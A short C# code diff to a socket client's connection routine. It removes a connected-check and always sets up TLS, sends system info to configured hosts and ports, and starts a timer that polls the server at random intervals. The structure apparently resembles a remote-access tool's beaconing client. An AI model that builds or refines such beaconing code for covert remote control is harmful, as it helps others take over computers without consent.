@@ -60,23 +60,16 @@ namespace Client.Sockets
                         Client.Connect(Settings.Hosts, Convert.ToInt32(Settings.Ports));
                     }
                 }
-                if (Client.Connected)
-                {
-                    Debug.WriteLine("Connected!");
-                    IsConnected = true;
-                    SslClient = new SslStream(new NetworkStream(Client, true), false, ValidateServerCertificate);
-                    SslClient.AuthenticateAsClient(Client.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
-                    Buffer = new byte[4];
-                    MS = new MemoryStream();
-                    Send(Methods.SendInfo());
-                    Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
-                    SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
-                }
-                else
-                {
-                    IsConnected = false;
-                    return;
-                }
+
+                Debug.WriteLine("Connected!");
+                IsConnected = true;
+                SslClient = new SslStream(new NetworkStream(Client, true), false, ValidateServerCertificate);
+                SslClient.AuthenticateAsClient(Client.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
+                Buffer = new byte[4];
+                MS = new MemoryStream();
+                Send(Methods.SendInfo());
+                Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
+                SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
             }
             catch
             {
